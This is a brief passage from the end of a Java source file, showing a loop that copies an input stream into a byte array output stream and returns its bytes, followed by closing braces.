      while ((count = input.read(buffer)) >= 0) {
        output.write(buffer, 0, count);
      }
      return output.toByteArray();
    }
  }
}
